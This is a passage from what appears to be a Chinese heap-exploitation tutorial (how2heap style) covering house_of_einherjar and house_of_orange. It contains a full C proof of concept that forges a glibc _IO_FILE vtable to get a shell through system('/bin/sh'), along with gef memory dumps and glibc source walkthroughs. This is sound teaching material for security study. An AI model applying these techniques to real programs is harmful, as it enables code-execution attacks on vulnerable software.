chunk\uff0c\u8ba9\u5408\u5e76\u540e\u7684\u5806\u5757\u8303\u56f4\u5230 fake chunk \u5904\uff0c\u90a3\u4e0b\u4e00\u6b21 malloc \u5c06\u8fd4\u56de\u6211\u4eec\u60f3\u8981\u7684\u5730\u5740\u3002\u6bd4\u8d77\u524d\u9762\u6240\u8bb2\u8fc7\u7684 poison-null-byte \uff0c\u66f4\u52a0\u5f3a\u5927\uff0c\u4f46\u662f\u8981\u6c42\u7684\u6761\u4ef6\u4e5f\u66f4\u591a\u4e00\u70b9\uff0c\u6bd4\u5982\u4e00\u4e2a\u5806\u4fe1\u606f\u6cc4\u6f0f\u3002 \u9996\u5148\u5206\u914d\u4e00\u4e2a\u5047\u8bbe\u5b58\u5728 off_by_one \u6ea2\u51fa\u7684 chunk a\uff0c\u7136\u540e\u5728\u6808\u4e0a\u521b\u5efa\u6211\u4eec\u7684 fake chunk\uff0cchunk \u5927\u5c0f\u968f\u610f\uff0c\u53ea\u8981\u662f small chunk \u5c31\u53ef\u4ee5\u4e86\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x0000000000020fe1 <-- top chunk 0x603030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0x0000000000000080 <-- fake chunk 0x7fffffffdcc0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdcd0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdce0: 0x00007fffffffddd0 0xffa7b97358729300 \u63a5\u4e0b\u6765\u521b\u5efa chunk b\uff0c\u5e76\u5229\u7528 chunk a \u7684\u6ea2\u51fa\u5c06 size \u5b57\u6bb5\u8986\u76d6\u6389\uff0c\u6e05\u9664\u4e86 PREV_INUSE \u6807\u5fd7\uff0cchunk b \u5c31\u4f1a\u4ee5\u4e3a\u524d\u4e00\u4e2a chunk \u662f\u4e00\u4e2a free chunk \u4e86\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0x4141414141414141 0x0000000000000100 <-- chunk b 0x603030: 0x0000000000000000 0x0000000000000000 \u539f\u672c chunk b \u7684 size \u5b57\u6bb5\u5e94\u8be5\u4e3a 0x101\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u9009\u62e9 malloc(0xf8) \u4f5c\u4e3a chunk b \u4e5f\u662f\u51fa\u4e8e\u65b9\u4fbf\u7684\u76ee\u7684\uff0c\u8986\u76d6\u540e\u53ea\u5f71\u54cd\u4e86\u6807\u5fd7\u4f4d\uff0c\u6ca1\u6709\u5f71\u54cd\u5230\u5927\u5c0f\u3002 \u63a5\u4e0b\u6765\u6839\u636e fake chunk \u5728\u6808\u4e0a\u7684\u4f4d\u7f6e\u4fee\u6539 chunk b \u7684 prev_size \u5b57\u6bb5\u3002\u8ba1\u7b97\u65b9\u6cd5\u662f\u7528 chunk b \u7684\u8d77\u59cb\u5730\u5740\u51cf\u53bb fake chunk \u7684\u8d77\u59cb\u5730\u5740\uff0c\u540c\u65f6\u4e3a\u4e86\u7ed5\u8fc7\u68c0\u67e5\uff0c\u8fd8\u9700\u8981\u5c06 fake chunk \u7684 size \u5b57\u6bb5\u4e0e chunk b \u7684 prev_size \u5b57\u6bb5\u76f8\u5339\u914d\uff1a gef\u27a4 x/8gx a-0x10 0x603000: 0x0000000000000000 0x0000000000000021 <-- chunk a 0x603010: 0x4141414141414141 0x4141414141414141 0x603020: 0xffff800000605370 0x0000000000000100 <-- chunk b <-- prev_size 0x603030: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0xffff800000605370 <-- fake chunk <-- size 0x7fffffffdcc0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdcd0: 0x00007fffffffdcb0 0x00007fffffffdcb0 0x7fffffffdce0: 0x00007fffffffddd0 0xadeb3936608e0600 \u91ca\u653e chunk b\uff0c\u8fd9\u65f6\u56e0\u4e3a PREV_INUSE \u4e3a\u96f6\uff0cunlink \u4f1a\u6839\u636e prev_size \u53bb\u5bfb\u627e\u4e0a\u4e00\u4e2a free chunk\uff0c\u5e76\u5c06\u5b83\u548c\u5f53\u524d chunk \u5408\u5e76\u3002\u4ece arena \u91cc\u53ef\u4ee5\u770b\u5230\uff1a gef\u27a4 heap arenas Arena (base=0x7ffff7dd1b20, top=0x7fffffffdcb0, last_remainder=0x0, next=0x7ffff7dd1b20, next_free=0x0, system_mem=0x21000) \u5408\u5e76\u7684\u8fc7\u7a0b\u5728 poison-null-byte \u90a3\u91cc\u4e5f\u8bb2\u8fc7\u4e86\u3002 \u6700\u540e\u5f53\u6211\u4eec\u518d\u6b21 malloc\uff0c\u5176\u8fd4\u56de\u7684\u5730\u5740\u5c06\u662f fake chunk \u7684\u5730\u5740\uff1a gef\u27a4 x/8gx &fake_chunk 0x7fffffffdcb0: 0x0000000000000080 0x0000000000000021 <-- chunk d 0x7fffffffdcc0: 0x4141414141414141 0x4141414141414141 0x7fffffffdcd0: 0x00007fffffffdcb0 0xffff800000626331 0x7fffffffdce0: 0x00007fffffffddd0 0xbdf40e22ccf46c00","title":"house_of_einherjar"},{"location":"Tutorial/Material/Binary%20Exploitation/#house_of_orange","text":"#include <stdio.h> #include <stdlib.h> #include <string.h> int winner (char *ptr); int main() { char *p1, *p2; size_t io_list_all, *top; p1 = malloc(0x400 - 0x10); top = (size_t *) ((char *) p1 + 0x400 - 0x10); top[1] = 0xc01; p2 = malloc(0x1000); io_list_all = top[2] + 0x9a8; top[3] = io_list_all - 0x10; memcpy((char *) top, \"/bin/sh\\x00\", 8); top[1] = 0x61; _IO_FILE *fp = (_IO_FILE *) top; fp->_mode = 0; // top+0xc0 fp->_IO_write_base = (char *) 2; // top+0x20 fp->_IO_write_ptr = (char *) 3; // top+0x28 size_t *jump_table = &top[12]; // controlled memory jump_table[3] = (size_t) &winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 malloc(1); return 0; } int winner(char *ptr) { system(ptr); return 0; } $ gcc -g house_of_orange.c $ ./a.out *** Error in `./a.out': malloc(): memory corruption: 0x00007f3daece3520 *** ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f3dae9957e5] /lib/x86_64-linux-gnu/libc.so.6(+0x8213e)[0x7f3dae9a013e] /lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f3dae9a2184] ./a.out[0x4006cc] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f3dae93e830] ./a.out[0x400509] ======= Memory map: ======== 00400000-00401000 r-xp 00000000 08:01 919342 /home/firmy/how2heap/a.out 00600000-00601000 r--p 00000000 08:01 919342 /home/firmy/how2heap/a.out 00601000-00602000 rw-p 00001000 08:01 919342 /home/firmy/how2heap/a.out 01e81000-01ec4000 rw-p 00000000 00:00 0 [heap] 7f3da8000000-7f3da8021000 rw-p 00000000 00:00 0 7f3da8021000-7f3dac000000 ---p 00000000 00:00 0 7f3dae708000-7f3dae71e000 r-xp 00000000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae71e000-7f3dae91d000 ---p 00016000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae91d000-7f3dae91e000 rw-p 00015000 08:01 398989 /lib/x86_64-linux-gnu/libgcc_s.so.1 7f3dae91e000-7f3daeade000 r-xp 00000000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daeade000-7f3daecde000 ---p 001c0000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daecde000-7f3daece2000 r--p 001c0000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daece2000-7f3daece4000 rw-p 001c4000 08:01 436912 /lib/x86_64-linux-gnu/libc-2.23.so 7f3daece4000-7f3daece8000 rw-p 00000000 00:00 0 7f3daece8000-7f3daed0e000 r-xp 00000000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daeef4000-7f3daeef7000 rw-p 00000000 00:00 0 7f3daef0c000-7f3daef0d000 rw-p 00000000 00:00 0 7f3daef0d000-7f3daef0e000 r--p 00025000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daef0e000-7f3daef0f000 rw-p 00026000 08:01 436908 /lib/x86_64-linux-gnu/ld-2.23.so 7f3daef0f000-7f3daef10000 rw-p 00000000 00:00 0 7ffe8eba6000-7ffe8ebc7000 rw-p 00000000 00:00 0 [stack] 7ffe8ebee000-7ffe8ebf1000 r--p 00000000 00:00 0 [vvar] 7ffe8ebf1000-7ffe8ebf3000 r-xp 00000000 00:00 0 [vdso] ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0 [vsyscall] $ whoami firmy $ exit Aborted (core dumped) house-of-orange \u662f\u4e00\u79cd\u5229\u7528\u5806\u6ea2\u51fa\u4fee\u6539 _IO_list_all \u6307\u9488\u7684\u5229\u7528\u65b9\u6cd5\u3002\u5b83\u8981\u6c42\u80fd\u591f\u6cc4\u6f0f\u5806\u548c libc\u3002\u6211\u4eec\u77e5\u9053\u4e00\u5f00\u59cb\u7684\u65f6\u5019\uff0c\u6574\u4e2a\u5806\u90fd\u5c5e\u4e8e top chunk\uff0c\u6bcf\u6b21\u7533\u8bf7\u5185\u5b58\u65f6\uff0c\u5c31\u4ece top chunk \u4e2d\u5212\u51fa\u8bf7\u6c42\u5927\u5c0f\u7684\u5806\u5757\u8fd4\u56de\u7ed9\u7528\u6237\uff0c\u4e8e\u662f top chunk \u5c31\u8d8a\u6765\u8d8a\u5c0f\u3002 \u5f53\u67d0\u4e00\u6b21 top chunk \u7684\u5269\u4f59\u5927\u5c0f\u5df2\u7ecf\u4e0d\u80fd\u591f\u6ee1\u8db3\u8bf7\u6c42\u65f6\uff0c\u5c31\u4f1a\u8c03\u7528\u51fd\u6570 sysmalloc() \u5206\u914d\u65b0\u5185\u5b58\uff0c\u8fd9\u65f6\u53ef\u80fd\u4f1a\u53d1\u751f\u4e24\u79cd\u60c5\u51b5\uff0c\u4e00\u79cd\u662f\u76f4\u63a5\u6269\u5145 top chunk\uff0c\u53e6\u4e00\u79cd\u662f\u8c03\u7528 mmap \u5206\u914d\u4e00\u5757\u65b0\u7684 top chunk\u3002\u5177\u4f53\u8c03\u7528\u54ea\u4e00\u79cd\u65b9\u6cd5\u662f\u7531\u7533\u8bf7\u5927\u5c0f\u51b3\u5b9a\u7684\uff0c\u4e3a\u4e86\u80fd\u591f\u4f7f\u7528\u524d\u4e00\u79cd\u6269\u5c55 top chunk\uff0c\u9700\u8981\u8bf7\u6c42\u5c0f\u4e8e\u9600\u503c mp_.mmap_threshold \uff1a if (av == NULL || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold) && (mp_.n_mmaps < mp_.n_mmaps_max))) { \u540c\u65f6\uff0c\u4e3a\u4e86\u80fd\u591f\u8c03\u7528 sysmalloc() \u4e2d\u7684 _int_free() \uff0c\u9700\u8981 top chunk \u5927\u4e8e MINSIZE \uff0c\u5373 0x10\uff1a if (old_size >= MINSIZE) { _int_free (av, old_top, 1); } \u5f53\u7136\uff0c\u8fd8\u5f97\u7ed5\u8fc7\u4e0b\u9762\u4e24\u4e2a\u9650\u5236\u6761\u4ef6\uff1a /* If not the first time through, we require old_size to be at least MINSIZE and to have prev_inuse set. */ assert ((old_top == initial_top (av) && old_size == 0) || ((unsigned long) (old_size) >= MINSIZE && prev_inuse (old_top) && ((unsigned long) old_end & (pagesize - 1)) == 0)); /* Precondition: not enough current space to satisfy nb request */ assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE)); \u5373\u6ee1\u8db3 old_size \u5c0f\u4e8e nb+MINSIZE \uff0c PREV_INUSE \u6807\u5fd7\u4f4d\u4e3a 1\uff0c old_top+old_size \u9875\u5bf9\u9f50\u8fd9\u51e0\u4e2a\u6761\u4ef6\u3002 \u9996\u5148\u5206\u914d\u4e00\u4e2a\u5927\u5c0f\u4e3a 0x400 \u7684 chunk\uff1a gef\u27a4 x/4gx p1-0x10 0x602000: 0x0000000000000000 0x0000000000000401 <-- chunk p1 0x602010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000020c01 <-- top chunk 0x602410: 0x0000000000000000 0x0000000000000000 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ctop chunk \u5927\u5c0f\u4e3a 0x21000\uff0c\u51cf\u53bb 0x400\uff0c\u6240\u4ee5\u6b64\u65f6\u7684\u5927\u5c0f\u4e3a 0x20c00\uff0c\u53e6\u5916 PREV_INUSE \u88ab\u8bbe\u7f6e\u3002 \u73b0\u5728\u5047\u8bbe\u5b58\u5728\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u53ef\u4ee5\u4fee\u6539 top chunk \u7684\u6570\u636e\uff0c\u4e8e\u662f\u6211\u4eec\u5c06 size \u5b57\u6bb5\u4fee\u6539\u4e3a 0xc01\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u6ee1\u8db3\u4e0a\u9762\u6240\u8bf4\u7684\u6761\u4ef6\uff1a gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000c01 <-- top chunk 0x602410: 0x0000000000000000 0x0000000000000000 \u7d27\u63a5\u7740\uff0c\u7533\u8bf7\u4e00\u5757\u5927\u5185\u5b58\uff0c\u6b64\u65f6\u7531\u4e8e\u4fee\u6539\u540e\u7684 top chunk size \u4e0d\u80fd\u6ee1\u8db3\u9700\u6c42\uff0c\u5219\u8c03\u7528 sysmalloc \u7684\u7b2c\u4e00\u79cd\u65b9\u6cd5\u6269\u5145 top chunk\uff0c\u7ed3\u679c\u662f\u5728 old_top \u540e\u9762\u65b0\u5efa\u4e86\u4e00\u4e2a top chunk \u7528\u6765\u5b58\u653e new_top\uff0c\u7136\u540e\u5c06 old_top \u91ca\u653e\uff0c\u5373\u88ab\u6dfb\u52a0\u5230\u4e86 unsorted bin \u4e2d\uff1a gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000be1 <-- old top chunk [be freed] 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 <-- fd, bk pointer gef\u27a4 x/4gx p1-0x10+0x400+0xbe0 0x602fe0: 0x0000000000000be0 0x0000000000000010 <-- fencepost chunk 1 0x602ff0: 0x0000000000000000 0x0000000000000011 <-- fencepost chunk 2 gef\u27a4 x/4gx p2-0x10 0x623000: 0x0000000000000000 0x0000000000001011 <-- chunk p2 0x623010: 0x0000000000000000 0x0000000000000000 gef\u27a4 x/4gx p2-0x10+0x1010 0x624010: 0x0000000000000000 0x0000000000020ff1 <-- new top chunk 0x624020: 0x0000000000000000 0x0000000000000000 gef\u27a4 heap bins unsorted [ Unsorted Bin for arena 'main_arena' ] [+] unsorted_bins[0]: fw=0x602400, bk=0x602400 \u2192 Chunk(addr=0x602410, size=0xbe0, flags=PREV_INUSE) \u4e8e\u662f\u5c31\u6cc4\u6f0f\u51fa\u4e86 libc \u5730\u5740\u3002\u53e6\u5916\u53ef\u4ee5\u770b\u5230 old top chunk \u88ab\u7f29\u5c0f\u4e86 0x20\uff0c\u7f29\u5c0f\u7684\u7a7a\u95f4\u88ab\u7528\u4e8e\u653e\u7f6e fencepost chunk\u3002\u6b64\u65f6\u7684\u5806\u7a7a\u95f4\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff1a +---------------+ | p1 | +---------------+ | old top-0x20 | +---------------+ | fencepost 1 | +---------------+ | fencepost 2 | +---------------+ | ... | +---------------+ | p2 | +---------------+ | new top | +---------------+ \u8be6\u7ec6\u8fc7\u7a0b\u5982\u4e0b\uff1a if (old_size != 0) { /* Shrink old_top to insert fenceposts, keeping size a multiple of MALLOC_ALIGNMENT. We know there is at least enough space in old_top to do this. */ old_size = (old_size - 4 * SIZE_SZ) & ~MALLOC_ALIGN_MASK; set_head (old_top, old_size | PREV_INUSE); /* Note that the following assignments completely overwrite old_top when old_size was previously MINSIZE. This is intentional. We need the fencepost, even if old_top otherwise gets lost. */ chunk_at_offset (old_top, old_size)->size = (2 * SIZE_SZ) | PREV_INUSE; chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)->size = (2 * SIZE_SZ) | PREV_INUSE; /* If possible, release the rest. */ if (old_size >= MINSIZE) { _int_free (av, old_top, 1); } } \u6839\u636e\u653e\u5165 unsorted bin \u4e2d old top chunk \u7684 fd/bk \u6307\u9488\uff0c\u53ef\u4ee5\u63a8\u7b97\u51fa _IO_list_all \u7684\u5730\u5740\u3002\u7136\u540e\u901a\u8fc7\u6ea2\u51fa\u5c06 old top \u7684 bk \u6539\u5199\u4e3a _IO_list_all-0x10 \uff0c\u8fd9\u6837\u5728\u8fdb\u884c unsorted bin attack \u65f6\uff0c\u5c31\u4f1a\u5c06 _IO_list_all \u4fee\u6539\u4e3a &unsorted_bin-0x10 \uff1a /* remove from unsorted list */ unsorted_chunks (av)->bk = bck; bck->fd = unsorted_chunks (av); gef\u27a4 x/4gx p1-0x10+0x400 0x602400: 0x0000000000000000 0x0000000000000be1 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510 \u8fd9\u91cc\u8bb2\u4e00\u4e0b glibc \u4e2d\u7684\u5f02\u5e38\u5904\u7406\u3002\u4e00\u822c\u5728\u51fa\u73b0\u5185\u5b58\u9519\u8bef\u65f6\uff0c\u4f1a\u8c03\u7528\u51fd\u6570 malloc_printerr() \u6253\u5370\u51fa\u9519\u4fe1\u606f\uff0c\u6211\u4eec\u987a\u7740\u4ee3\u7801\u4e00\u76f4\u8ddf\u8e2a\u4e0b\u53bb\uff1a static void malloc_printerr (int action, const char *str, void *ptr, mstate ar_ptr) { [...] if ((action & 5) == 5) __libc_message (action & 2, \"%s\\n\", str); else if (action & 1) { char buf[2 * sizeof (uintptr_t) + 1]; buf[sizeof (buf) - 1] = '\\0'; char *cp = _itoa_word ((uintptr_t) ptr, &buf[sizeof (buf) - 1], 16, 0); while (cp > buf) *--cp = '0'; __libc_message (action & 2, \"*** Error in `%s': %s: 0x%s ***\\n\", __libc_argv[0] ? : \"<unknown>\", str, cp); } else if (action & 2) abort (); } \u8c03\u7528 __libc_message \uff1a // sysdeps/posix/libc_fatal.c /* Abort with an error message. */ void __libc_message (int do_abort, const char *fmt, ...) { [...] if (do_abort) { BEFORE_ABORT (do_abort, written, fd); /* Kill the application. */ abort (); } } do_abort \u8c03\u7528 fflush \uff0c\u5373 _IO_flush_all_lockp \uff1a // stdlib/abort.c #define fflush(s) _IO_flush_all_lockp (0) if (stage == 1) { ++stage; fflush (NULL); } // libio/genops.c int _IO_flush_all_lockp (int do_lock) { int result = 0; struct _IO_FILE *fp; int last_stamp; #ifdef _IO_MTSAFE_IO __libc_cleanup_region_start (do_lock, flush_cleanup, NULL); if (do_lock) _IO_lock_lock (list_all_lock); #endif last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; // \u5c06\u5176\u8986\u76d6 while (fp != NULL) { run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) #endif ) && _IO_OVERFLOW (fp, EOF) == EOF) // \u5c06\u5176\u4fee\u6539\u4e3a system \u51fd\u6570 result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) { /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; } else fp = fp->_chain; // \u6307\u5411\u6211\u4eec\u6307\u5b9a\u7684\u533a\u57df } #ifdef _IO_MTSAFE_IO if (do_lock) _IO_lock_unlock (list_all_lock); __libc_cleanup_region_end (0); #endif return result; } _IO_list_all \u662f\u4e00\u4e2a _IO_FILE_plus \u7c7b\u578b\u7684\u5bf9\u8c61\uff0c\u6211\u4eec\u7684\u76ee\u7684\u5c31\u662f\u5c06 _IO_list_all \u6307\u9488\u6539\u5199\u4e3a\u4e00\u4e2a\u4f2a\u9020\u7684\u6307\u9488\uff0c\u5b83\u7684 _IO_OVERFLOW \u6307\u5411 system\uff0c\u5e76\u4e14\u524d 8 \u5b57\u8282\u88ab\u8bbe\u7f6e\u4e3a '/bin/sh'\uff0c\u6240\u4ee5\u5bf9 _IO_OVERFLOW(fp, EOF) \u7684\u8c03\u7528\u6700\u7ec8\u4f1a\u53d8\u6210\u5bf9 system('/bin/sh') \u7684\u8c03\u7528\u3002 // libio/libioP.h /* We always allocate an extra word following an _IO_FILE. This contains a pointer to the function jump table used. This is for compatibility with C++ streambuf; the word can be used to smash to a pointer to a virtual function table. */ struct _IO_FILE_plus { _IO_FILE file; const struct _IO_jump_t *vtable; }; // libio/libio.h struct _IO_FILE { int _flags; /* High-order word is _IO_MAGIC; rest is flags. */ #define _IO_file_flags _flags /* The following pointers correspond to the C++ streambuf protocol. */ /* Note: Tk uses the _IO_read_ptr and _IO_read_end fields directly. */ char* _IO_read_ptr; /* Current read pointer */ char* _IO_read_end; /* End of get area. */ char* _IO_read_base; /* Start of putback+get area. */ char* _IO_write_base; /* Start of put area. */ char* _IO_write_ptr; /* Current put pointer. */ char* _IO_write_end; /* End of put area. */ char* _IO_buf_base; /* Start of reserve area. */ char* _IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ char *_IO_save_base; /* Pointer to start of non-current get area. */ char *_IO_backup_base; /* Pointer to first valid character of backup area */ char *_IO_save_end; /* Pointer to end of non-current get area. */ struct _IO_marker *_markers; struct _IO_FILE *_chain; int _fileno; #if 0 int _blksize; #else int _flags2; #endif _IO_off_t _old_offset; /* This used to be _offset but it's too small. */ #define __HAVE_COLUMN /* temporary */ /* 1+column number of pbase(); 0 is unknown. */ unsigned short _cur_column; signed char _vtable_offset; char _shortbuf[1]; /* char* _save_gptr; char* _save_egptr; */ _IO_lock_t *_lock; #ifdef _IO_USE_OLD_IO_FILE }; \u5176\u4e2d\u6709\u4e00\u4e2a\u6307\u5411\u51fd\u6570\u8df3\u8f6c\u8868\u7684\u6307\u9488\uff0c _IO_jump_t \u7684\u7ed3\u6784\u5982\u4e0b\uff1a // libio/libioP.h struct _IO_jump_t { JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* showmany */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue); #if 0 get_column; set_column; #endif }; \u4f2a\u9020 _IO_jump_t \u4e2d\u7684 __overflow \u4e3a system \u51fd\u6570\u7684\u5730\u5740\uff0c\u4ece\u800c\u8fbe\u5230\u6267\u884c shell \u7684\u76ee\u7684\u3002 \u5f53\u53d1\u751f\u5185\u5b58\u9519\u8bef\u8fdb\u5165 _IO_flush_all_lockp \u540e\uff0c _IO_list_all \u4ecd\u7136\u6307\u5411 unsorted bin\uff0c\u8fd9\u5e76\u4e0d\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u5740\u3002\u6240\u4ee5\u9700\u8981\u901a\u8fc7 fp->_chain \u6765\u5c06 fp \u6307\u5411\u6211\u4eec\u80fd\u63a7\u5236\u7684\u5730\u65b9\u3002\u6240\u4ee5\u5c06 size \u5b57\u6bb5\u8bbe\u7f6e\u4e3a 0x61\uff0c\u56e0\u4e3a\u6b64\u65f6 _IO_list_all \u662f &unsorted_bin-0x10 \uff0c\u504f\u79fb 0x60 \u4f4d\u7f6e\u4e0a\u662f smallbins[5]\u3002\u6b64\u65f6\uff0c\u5982\u679c\u89e6\u53d1\u4e00\u4e2a\u4e0d\u9002\u5408\u7684 small chunk \u5206\u914d\uff0cmalloc \u5c31\u4f1a\u5c06 old top \u4ece unsorted bin \u653e\u56de smallbins[5] \u4e2d\u3002\u800c\u5728 _IO_FILE \u7ed3\u6784\u4e2d\uff0c\u504f\u79fb 0x60 \u6307\u5411 struct _IO_marker *_markers \uff0c\u504f\u79fb 0x68 \u6307\u5411 struct _IO_FILE *_chain \uff0c\u8fd9\u4e24\u4e2a\u503c\u6b63\u597d\u662f old top \u7684\u8d77\u59cb\u5730\u5740\u3002\u8fd9\u6837 fp \u5c31\u6307\u5411\u4e86 old top\uff0c\u8fd9\u662f\u4e00\u4e2a\u6211\u4eec\u80fd\u591f\u63a7\u5236\u7684\u5730\u5740\u3002 \u5728\u5c06 _IO_OVERFLOW \u4fee\u6539\u4e3a system \u7684\u65f6\u5019\uff0c\u6709\u4e00\u4e9b\u6761\u4ef6\u68c0\u67e5\uff1a if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base) #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)) #endif ) && _IO_OVERFLOW (fp, EOF) == EOF) // \u9700\u8981\u4fee\u6539\u4e3a system \u51fd\u6570 // libio/libio.h struct _IO_wide_data *_wide_data; /* Extra data for wide character streams. */ struct _IO_wide_data { wchar_t *_IO_read_ptr; /* Current read pointer */ wchar_t *_IO_read_end; /* End of get area. */ wchar_t *_IO_read_base; /* Start of putback+get area. */ wchar_t *_IO_write_base; /* Start of put area. */ wchar_t *_IO_write_ptr; /* Current put pointer. */ wchar_t *_IO_write_end; /* End of put area. */ wchar_t *_IO_buf_base; /* Start of reserve area. */ wchar_t *_IO_buf_end; /* End of reserve area. */ /* The following fields are used to support backing up and undo. */ wchar_t *_IO_save_base; /* Pointer to start of non-current get area. */ wchar_t *_IO_backup_base; /* Pointer to first valid character of backup area */ wchar_t *_IO_save_end; /* Pointer to end of non-current get area. */ __mbstate_t _IO_state; __mbstate_t _IO_last_state; struct _IO_codecvt _codecvt; wchar_t _shortbuf[1]; const struct _IO_jump_t *_wide_vtable; }; \u6240\u4ee5\u8fd9\u91cc\u6211\u4eec\u8bbe\u7f6e fp->_mode = 0 \uff0c fp->_IO_write_base = (char *) 2 \u548c fp->_IO_write_ptr = (char *) 3 \uff0c\u4ece\u800c\u7ed5\u8fc7\u68c0\u67e5\u3002 \u7136\u540e\uff0c\u5c31\u662f\u4fee\u6539 _IO_jump_t \uff0c\u5c06\u5176\u6307\u5411 winner\uff1a gef\u27a4 x/30gx p1-0x10+0x400 0x602400: 0x0068732f6e69622f 0x0000000000000061 <-- old top 0x602410: 0x00007ffff7dd1b78 0x00007ffff7dd2510 <-- bk points to io_list_all-0x10 0x602420: 0x0000000000000002 0x0000000000000003 <-- _IO_write_base, _IO_write_ptr 0x602430: 0x0000000000000000 0x0000000000000000 0x602440: 0x0000000000000000 0x0000000000000000 0x602450: 0x0000000000000000 0x0000000000000000 0x602460: 0x0000000000000000 0x0000000000000000 0x602470: 0x0000000000000000 0x00000000004006d3 <-- winner 0x602480: 0x0000000000000000 0x0000000000000000 0x602490: 0x0000000000000000 0x0000000000000000 0x6024a0: 0x0000000000000000 0x0000000000000000 0x6024b0: 0x0000000000000000 0x0000000000000000 0x6024c0: 0x0000000000000000 0x0000000000000000 0x6024d0: 0x0000000000000000 0x0000000000602460 <-- vtable 0x6024e0: 0x0000000000000000 0x0000000000000000 gef\u27a4 p *((struct _IO_FILE_plus *) 0x602400) $1 = { file = { _flags = 0x6e69622f, _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, _IO_read_end = 0x7ffff7dd1b78 <main_arena+88> \"\\020@b\", _IO_read_base = 0x7ffff7dd2510 \"\", _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, _IO_write_end = 0x0, _IO_buf_base = 0x0, _IO_buf_end = 0x0, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0x4006d3, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = \"\", _lock = 0x0, _offset = 0x0, _codecvt = 0x0, _wide_data = 0x0, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0x0, _unused2 = '\\000' <repeats 19 times> }, vtable = 0x602460 } \u6700\u540e\u968f\u610f\u5206\u914d\u4e00\u4e2a chunk\uff0c\u7531\u4e8e size<= 2*SIZE_SZ \uff0c\u6240\u4ee5\u4f1a\u89e6\u53d1 